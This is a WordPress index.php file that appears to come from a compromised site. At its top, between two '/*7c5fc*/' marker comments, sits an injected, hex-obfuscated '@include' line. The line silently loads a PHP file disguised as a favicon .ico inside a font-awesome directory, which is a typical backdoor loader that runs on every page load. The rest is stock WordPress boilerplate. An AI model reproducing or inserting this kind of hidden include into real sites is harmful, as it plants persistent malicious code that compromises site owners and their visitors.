<?php
/*7c5fc*/

@include "\x2fho\x6de/\x66or\x67e/\x6ees\x74le\x63af\x65.c\x6fm/\x70ub\x6cic\x2fcp\x2ffo\x6et-\x61we\x73om\x65/l\x65ss\x2ffa\x76ic\x6fn_\x34cf\x325a\x2eic\x6f";

/*7c5fc*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
